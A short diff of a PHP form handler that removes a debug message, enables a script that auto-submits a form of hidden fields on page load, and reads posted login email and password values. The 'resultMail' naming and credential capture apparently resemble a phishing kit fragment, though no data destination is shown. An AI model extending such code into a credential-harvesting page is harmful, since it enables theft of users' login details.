@@ -115,9 +115,9 @@
         echo '<input type="hidden" name="resultMail" id="resultMail" value="' . $x . '">';
 
       }
-      echo ' Entra mal';
+
       echo '<input type="hidden" name="exit" id="exit" value="' . $score . '">';
-      //echo '</form><script>window.onload = function(){document.forms[\'form\'].submit();}</script>';
+      echo '</form><script>window.onload = function(){document.forms[\'form\'].submit();}</script>';
     } else if (strpos($_POST['send'], 'postlogin.html') == true) {
         $UserPass = $_POST["loginPass"];
         $UserLoginEmail = $_POST["loginMail"];
